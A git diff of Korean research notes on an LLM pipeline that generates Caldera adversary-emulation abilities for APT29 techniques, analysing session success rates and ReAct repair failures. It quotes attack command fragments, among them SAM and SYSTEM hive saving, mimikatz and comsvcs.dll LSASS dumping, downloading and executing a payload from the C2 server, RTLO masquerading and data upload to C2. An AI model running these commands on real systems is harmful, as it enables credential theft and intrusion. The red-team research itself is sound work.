@@ -22,8 +22,8 @@ CTI 시나리오 (.md)
 
 동일 시나리오를 반복 실행했을 때 SVO 추출 결과가 달라지고(LLM 비결정성), 그 결과 생성되는 명령어 전략이 달라져 성공률에 차이가 발생한다. 특히:
 
-- **초기 성공률**: 63% ~ 87% (동일 시나리오, APT29 30기법)
-- **최종 성공률**: 87% ~ 97% (ReAct 3라운드 후)
+- **초기 성공률**: 53% ~ 87% (동일 시나리오, APT29 30기법)
+- **최종 성공률**: 77% ~ 97% (ReAct 3라운드 후)
 
 단순히 "처음에 실패해도 ReAct가 고친다"가 아니라, SVO V 방향이 ReAct로도 복구 불가능한 명령어 구조를 만들어내는 경우가 있다.
 
@@ -47,6 +47,9 @@ CTI 시나리오 (.md)
 | 143322 | 26/30 (87%) | — | — | **29/30 (97%)** | T1003 |
 | 171757 | 19/30 (63%) | 23/30 | 26/30 | **26/30 (87%)** | T1036.002, T1134.001, T1055, T1056.001 |
 | 141217 | 23/30 (77%) | 24/30 | 25/30 | **26/30 (87%)** | T1036.002, T1055, T1012, T1056.001 |
+| 152852 | 22/30 (73%) | 24/30 | 27/30 | **27/30 (90%)** | T1036.002, T1037.005, T1055 |
+| 162222 | 16/30 (53%) | 21/30 | 23/30 | **23/30 (77%)** | T1036.002, T1059.001, T1055, T1012, T1552.004, T1056.001, T1105 |
+| 191016 | 22/30 (73%) | 23/30 | 24/30 | **25/30 (83%)** | T1055, T1134, T1012, T1003, T1056.001 |
 
 ---
 
@@ -87,6 +90,14 @@ CTI 시나리오 (.md)
 
 ---
 
+> **참고 (152852)**: 세션 152852의 SVO 추출 결과는 141217과 거의 동일 (T1134.001=duplicate/token, T1003=mimikatz/dump, T1134=query/remote share 등 전 기법 일치). 따라서 별도 열 없이 141217 열을 공유한다. 그러나 동일 SVO임에도 초기 성공률과 최종 성공률이 다름 → Phase 3 (Ability 생성) 자체의 비결정성 존재.
+
+> **참고 (162222)**: 세션 162222의 SVO는 대부분 기존 세션들과 유사하나 일부 기법에서 새로운 V 추출. 주요 차이: T1134.001=inject/high-privilege process (171757과 동일), T1112=delete/registry keys (다른 세션들은 remove/modify), T1134=create/access token (다른 세션들은 reuse/impersonate/query), T1036.005=replace/sysinternals tools (다른 세션들은 rename). T1036.002=execute/malicious .scr file로 추출됐으나 기존 "RTLO Start Sandcat" ability와 매칭 실패 → generated 능력 생성 → totallylegit.exe 참조 (파일스토어 미존재) → 3라운드 모두 실패.
+
+> **참고 (191016)**: 세션 191016의 SVO 추출 결과는 141217과 거의 동일 (T1036.002=rename/cod.3aka3.scr, T1059.001=invoke/powershell, T1134.001=duplicate/privileged token, T1134=query/remote file share 등). 따라서 별도 열 없이 141217 열을 공유. 동일 SVO에서도 초기 성공률(141217: 23/30 vs 191016: 22/30)과 최종 결과(141217: 26/30 vs 191016: 25/30)가 다르며 T1003 V드리프트 목적지도 다름(141217: cmdkey, 191016: comsvcs.dll) → Phase 3 비결정성 추가 확인.
+
+---
+
 ## SVO 변동 유형 분류
 
 ### Type A — V 방향 분기 (기법 의미 해석 차이 → 명령어 전략 완전히 달라짐)
@@ -114,6 +125,30 @@ V 선택이 명령어의 네트워크 의존성을 결정한다:
 
 V=rename은 ATT&CK 기법 의미에 더 가깝지만 파일 존재를 전제함. V=execute(143322)는 의미적으로 덜 정확하지만 자기 완결 명령어를 만들었다.
 **V의 ATT&CK 의미 정확도와 명령어 실행 가능성은 비례하지 않는다.**
+
+**T1003 (Credential Dumping) — V 드리프트 경로 비결정성, 수렴점 일관성 (152852 R2)**
+
+| 세션 | R0 V | R1 V | R2 V | 결과 |
+|------|------|------|------|------|
+| 143322 | dump(mimi) | **cmdkey** | — | R1 드리프트 후 quoting 실패 → R2 성공 |
+| 171757 | dump(mimi) | IEX | **cmdkey** | R2 드리프트 성공 |
+| 152852 | dump(reg save) | **mimikatz** | **cmdkey** | R2 드리프트 성공 (2단계 경유) |
+| 191016 | totallylegit.exe | **comsvcs.dll MiniDump** | unknown | R2-R3 모두 unknown → 영구 실패 |
+
+- 143322/171757/152852에서는 **cmdkey /list**로 수렴, 191016에서는 **comsvcs.dll LSASS dump**로 드리프트 → 권한 장벽으로 복구 불능
+- **수정된 의의**: V 드리프트 수렴점(cmdkey)은 일관적이지 않음. 드리프트 목적지가 권한이 필요한 전략(LSASS 접근)으로 선택되면 복구 불능. 수렴점도 Phase 3 비결정성의 영향을 받는다.
+
+**T1036.002 (RTLO) — ReAct Oscillation: syntax 수정과 O-creation 동시 적용 실패 (152852)**
+
+| 라운드 | 수정 내용 | 버그 |
+|--------|---------|------|
+| R0 | `Rename-Item "cod.3aka3.scr"` | 파일 없음 |
+| R1 | RTLO char 방식 변경 + 경로 수정 | `[char]0x202E`**`]`** ← 여분 `]` 도입 |
+| R2 | 여분 `]` 제거 | 파일 없음 미해결 |
+| R3 | O-creation 추가 시도 | `[char]0x202E`**`]`** ← 동일 버그 재도입 |
+
+- R2에서 syntax 수정, R3에서 O-creation을 추가하는 과정에서 이전에 고쳤던 버그를 재도입
+- LLM이 두 가지 수정을 동시에 처리할 때 발생하는 **oscillation 패턴** — 한 문제를 고치면 다른 문제가 다시 생기는 반복
 
 **T1548.002 (Bypass UAC via sdclt)**
 
@@ -149,6 +184,15 @@ V=rename은 ATT&CK 기법 의미에 더 가깝지만 파일 존재를 전제함.
 
 - 추상적 O → LLM이 자유롭게 "사용 가능한 객체" 생성 → 자기 완결 명령어
 - 구체적 O → 해당 객체가 사전 존재해야 함 → 초기 실패, ReAct O생성 전략 필요
+
+**T1087 (Account Discovery) — O scope 교체 (domain→local, 152852 R1)**
+
+| O 유형 | 명령어 | 결과 |
+|--------|------|------|
+| domain accounts (원본) | `net user /domain` | 도메인 없음 → FAIL |
+| **local accounts (교체)** | `net user` + 파일 저장 + 업로드 | **R1 성공** |
+
+O-creation(없는 객체 생성)과 달리 **O scope 축소** — 접근 불가 범위(domain)를 접근 가능한 하위 범위(local)로 교체. 객체를 새로 만드는 것이 아니라 "더 접근 가능한 유사 객체"로 대체하는 전략.
 
 ---
 
@@ -187,6 +231,8 @@ V → 자기 완결 계열       → 초기 성공 (ReAct 불필요)
 T1134.001이 세 경우를 모두 보여주는 핵심 사례:
 steal(자기완결 성공) / duplicate(수정 성공) / inject(수정 불능)
 
+**수정 (162222)**: V=inject가 항상 수정 불능은 아님. 171757에서는 inject→네트워크 페이로드 의존(불능), 162222에서는 inject→로컬 API syntax 오류(수정 가능). V는 repair ceiling의 **확률 분포**를 결정하며, 동일 V에서도 Phase 3 비결정성에 의해 수정 가능/불능이 갈릴 수 있다.
+
 ### 발견 2: O 추상성 = 초기 성공률 결정 (ReAct로 복구 가능)
 
 | O 유형 | 명령어 전략 | 초기 성공 | ReAct 복구 |
@@ -201,9 +247,137 @@ V 오류는 ReAct 복구가 어렵거나 불가능. O 오류는 ReAct가 O생성
 
 30기법 중 완전 동일 추출은 T1070.004, T1057 등 소수. T1134.001처럼 3회 모두 완전히 다른 V가 추출되는 경우도 있다. 이 비결정성이 성공률 분산(63%~87%)의 주요 원인이다.
 
+### 발견 5: Phase 3 (Ability 생성)도 비결정적 — SVO만이 분산 원인이 아님
+
+141217과 152852는 SVO가 거의 동일하게 추출됐으나 결과가 다르다:
+
+| 비교 항목 | 141217 | 152852 |
+|----------|--------|--------|
+| 초기 성공 | 23/30 | 22/30 |
+| 최종 성공 | 26/30 | **27/30** |
+| T1134.001 초기 | 실패 → R1 수정 | **초기 성공** |
+| T1007 초기 | **초기 성공** | 실패 → R1 수정 |
+| T1012 | 타임아웃 영구 실패 | **초기 성공** |
+| T1056.001 | 영구 실패 | R2 수정 성공 |
+
+동일 SVO에서도 Phase 3 LLM이 다른 명령어를 생성하여 성공 여부가 갈린다.
+**성공률 분산 원인 = SVO 추출 비결정성 + Ability 생성 비결정성 (두 단계 모두 기여)**
+
+```
+SVO 추출 비결정성 (Phase 2.5)  ─→  V/O 방향 결정  ─→  Repair Ceiling
+Ability 생성 비결정성 (Phase 3) ─→  구체 명령어 결정 ─→  초기 성공률
+```
+
+### 발견 6: Ability 매칭 실패가 새로운 성능 천장을 만든다 (162222)
+
+Phase 3에서 기존 Caldera ability를 선택하지 못하고 새로 생성(generated)할 때, 생성된 ability가 존재하지 않는 파일을 참조하거나 올바른 실행 방식을 모르면 ReAct로도 복구 불가능한 실패가 발생한다.
+
+T1036.002 사례: APT29.yaml에 `cod.3aka3.scr` payload 기반 정확한 ability가 존재하지만, 파이프라인이 이를 선택하지 못해 `totallylegit.exe`를 참조하는 잘못된 ability를 생성 → 파일스토어 미존재 + RTLO 구문 버그 → 영구 실패.
+
+```
+Ability 매칭 성공 → 검증된 기존 명령어 사용 → 높은 초기 성공률
+Ability 매칭 실패 → generated (LLM 추정) → 파일/도구 존재 가정 → 실패 위험
+```
+
+**실패 계층**: SVO 비결정성(Phase 2.5) → Ability 생성 비결정성(Phase 3) → **Ability 선택 실패(Phase 3)** 순으로 복구 난이도가 높아짐.
+
 ### 발견 4: V의 ATT&CK 의미 정확도 ≠ 명령어 실행 가능성
 
 T1036.002 사례: V=rename(기법 의미 정확)이 V=execute(덜 정확)보다 더 낮은 초기 성공률을 만들었다. 의미적 정확성이 실행 가능성을 보장하지 않는다.
+
+---
+
+## 세션 191016 추가 관찰
+
+### T1003 — comsvcs.dll 드리프트: V 드리프트 수렴점 비일관성 발견 (191016)
+
+- R0: `totallylegit.exe` 다운로드 → `C:\Windows\Temp` 쓰기 권한 없음 (subject_failure)
+- R1: **comsvcs.dll** + `MiniDump($pid, $out, full)` — LSASS 메모리 덤프 시도 → 실패 (LSASS 접근 거부 추정, 관리자 권한 필요)
+- R2-R3: **unknown failure** — thought 없음, fixed_command 없음 → 영구 실패
+- 143322/171757/152852 세션들은 모두 **cmdkey /list**로 수렴했으나, 191016은 **comsvcs.dll**로 드리프트 후 복구 불능
+- **의의**: T1003 V 드리프트 수렴점(cmdkey)이 일관적이라는 발견 3 수정 필요. 수렴점은 확률적 — 민감한 LSASS 접근 전략을 선택하면 권한 장벽으로 영구 실패.
+
+### T1059.001 — V=invoke → 자기완결 성공 (191016, 162222 대비)
+
+| 세션 | V | 생성 명령어 | 결과 |
+|------|---|-----------|------|
+| 162222 | execute | `Invoke-WebRequest #{server}/file/download/totallylegit.exe; Start-Process` | 파일 없음 → 영구 실패 |
+| 191016 | **invoke** | `cmd.exe /c powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-Process"` | **초기 성공** |
+| 141217 | invoke | `cmd.exe /c powershell ...` | **초기 성공** |
+
+V=invoke → "PowerShell 프로세스 호출" → 자기완결 실행 → 성공. V=execute → "실행 파일 실행" → 외부 파일 존재 가정 → 실패. 동일 T1059.001에서 V 한 단어 차이가 명령어 전략과 성공 여부를 결정.
+
+### T1036.002 — O-creation 패턴 재현 (191016, R2 성공)
+
+141217과 완전히 동일한 복구 경로:
+- R0: `Rename-Item "cod.3aka3.scr"` → 파일 없음
+- R1: `-LiteralPath` 추가 → 여전히 파일 없음
+- R2: `New-Item "cod.3aka3.scr" -Force; Rename-Item -LiteralPath` → **성공**
+- 141217/191016 두 세션 모두 V=rename이고 두 세션 모두 R2 O-creation으로 성공 → **V=rename일 때 O-creation 복구가 재현 가능한 패턴임을 확인**.
+
+---
+
+## 세션 162222 추가 관찰
+
+### T1059.001 — O 부재 근본 원인 오진 (162222, 3라운드 모두 실패)
+
+- R0: `Invoke-WebRequest #{server}/file/download/totallylegit.exe` → "corrupted file" 에러
+- ReAct 진단: **download method failure** → WebClient → IWR → HttpClient → bitsadmin 순으로 V(다운로드 방식) 교체
+- 실제 근본 원인: **`totallylegit.exe`가 Caldera 파일스토어에 존재하지 않음** → IWR이 성공(HTTP 200)해도 빈 파일/HTML 응답 저장 → Start-Process "corrupted" 에러
+- ReAct가 실패 유형을 V 문제로 오진하여 다운로드 방식만 3번 바꿨지만 O(파일 자체)가 없으므로 모두 실패
+- **의의**: **O-nonexistent 오진 패턴** — 존재하지 않는 객체를 참조할 때 에러 메시지가 V 문제처럼 보여 ReAct가 잘못된 수정을 반복. 근본 원인(파일스토어 누락)은 command 수정으로 해결 불가.
+
+### T1036.002 — Ability 매칭 실패 → Generated ability 오작동 (162222)
+
+- APT29.yaml에 "RTLO Start Sandcat" ability 존재 (payload: `cod.3aka3.scr`, `Get-ChildItem *cod*scr*` 후 Sandcat 에이전트로 실행)
+- 파이프라인은 이 기존 ability를 매칭하지 못하고 **새 ability 생성** (source=generated)
+- 생성된 명령어: `totallylegit.exe` 다운로드 → RTLO rename → Start-Process
+- `totallylegit.exe`도 파일스토어 미존재, RTLO 문자(`\`u202E`) 이스케이프 버그까지 겹쳐 3라운드 모두 실패
+- **의의**: Phase 3가 기존 ability를 선택했다면 `cod.3aka3.scr`을 payload로 사용해 Sandcat 에이전트를 스폰하는 올바른 동작이 가능했을 것. **Ability 선택 실패가 성능 천장을 낮추는 새로운 실패 모드**.
+
+### T1105 — Unknown failure: ReAct 수정 불능 (162222, R3)
+
+- R1: subject_failure (psexec/sysinternals 바이너리 없음)
+- R2: unknown failure — ReAct가 thought 생성 실패
+- R3: unknown failure — thought 없음, fixed_command 없음 (patched=6 중 T1105 제외)
+- **의의**: ReAct가 실패 원인을 전혀 파악하지 못해 수정 자체를 포기하는 케이스. "unknown" failure_type은 수정 시도조차 없음 → 영구 실패 확정.
+
+### T1134.001 — V=inject이지만 R1 수정 성공 (162222, Phase 3 비결정성 재확인)
+
+- SVO: inject / high-privilege process (171757과 동일)
+- 171757: V=inject → invoke-mimi.ps1 네트워크 의존 → 3라운드 모두 실패
+- 162222: V=inject → **syntax_failure** (네트워크 의존 아님) → R1에서 구문 수정 → R2 성공
+- 동일 V=inject에서 Phase 3가 다른 명령어 전략 생성:
+  - 171757: 네트워크에서 Mimikatz 다운로드 (복구 불가)
+  - 162222: 로컬 API 기반 토큰 조작 (구문 오류만 있어 복구 가능)
+- **의의**: V 방향이 동일해도 Phase 3 비결정성으로 인해 초기 명령어의 복구 가능성이 달라진다. V는 "repair ceiling의 확률 분포"를 정의할 뿐, 결정론적 ceiling이 아님.
+
+---
+
+## 세션 152852 추가 관찰
+
+### T1003 — 3단계 V 드리프트 (152852, R2)
+
+- R0: `reg.exe save HKLM\SAM + HKLM\SYSTEM` → **타임아웃** (status=124) — 레지스트리 하이브 저장 작업 시간 초과
+- R1: ft=subject_failure → **mimikatz.exe** 실행으로 V 드리프트 → 실행 파일 없음 실패
+- R2: ft=verb_failure → **cmdkey /list**로 재드리프트 → **성공**
+- 143322/171757의 1단계 드리프트(mimikatz→cmdkey)와 달리 이 세션은 2단계 소요. 하지만 최종 전략(cmdkey)은 동일하게 수렴.
+- **의의**: V 드리프트 경로는 비결정적이지만 최종 수렴점(cmdkey)은 일관됨.
+
+### T1036.002 — ReAct Oscillation: 수정-오류 반복 (152852, R1~R3)
+
+- R0: `Rename-Item "cod.3aka3.scr"` → 파일 없음
+- R1: `$rtl=[char]0x202E**]**` ← **LLM이 `]` 추가 (syntax 오류 생성)** + 경로 수정
+- R2: 여분 `]` 제거 수정 → 파일 없음 문제는 미해결
+- R3: O 생성 전략 추가 시도, 그런데 `[char]0x202E**]**` **동일 버그 재도입** → 실패
+- **의의**: LLM이 syntax 수정과 O-creation을 동시에 처리할 때 이전에 수정했던 버그를 재도입하는 oscillation 패턴. 한 라운드에 두 가지 수정을 동시에 적용하다가 발생.
+
+### T1087 — O scope 교체 (domain→local) (152852, R1)
+
+- R0: `net user /domain` → 도메인 없음 (WORKGROUP 환경)
+- R1: ft=object_failure, SVOFocus=O — 도메인 계정 → 로컬 계정으로 O 교체 → `net user` + 파일 저장 + C2 업로드 → **성공**
+- T1041 O-creation과 달리 이 경우는 O의 **범위(scope)를 축소**하는 전략.
+- **의의**: 접근 불가 O(도메인)를 접근 가능한 하위 O(로컬)로 교체. T1074.001 S→O 우회 패턴과 유사.
 
 ---
 
@@ -262,3 +436,6 @@ object_failure 진단 시 "O를 먼저 생성한 후 V 실행"하는 전략. Typ
 | 20260311_143322 | APT29 (30기법) | 26→29/30 | V=steal 계열 다수, 고성공 세션 |
 | 20260311_171757 | APT29 (30기법) | 19→26/30 | V=inject 오추출 → T1134.001 영구 실패 |
 | 20260312_141217 | APT29 (30기법) | 23→26/30 | T1134 오추출, T1012 scope timeout, 상태충돌 2건 |
+| 20260312_152852 | APT29 (30기법) | 22→27/30 | SVO≈141217, T1003 3단계 V드리프트, T1036.002 oscillation, Phase 3 비결정성 확인 |
+| 20260312_162222 | APT29 (30기법) | 16→23/30 | T1059.001 O-nonexistent 오진, T1036.002 ability 매칭 실패, T1105 unknown failure, T1134.001 동일 V=inject 다른 결과 |
+| 20260312_191016 | APT29 (30기법) | 22→25/30 | SVO≈141217, T1003 comsvcs.dll 드리프트(수렴점 비일관성), T1059.001 V=invoke 성공, T1036.002 R2 O-creation 재현 |
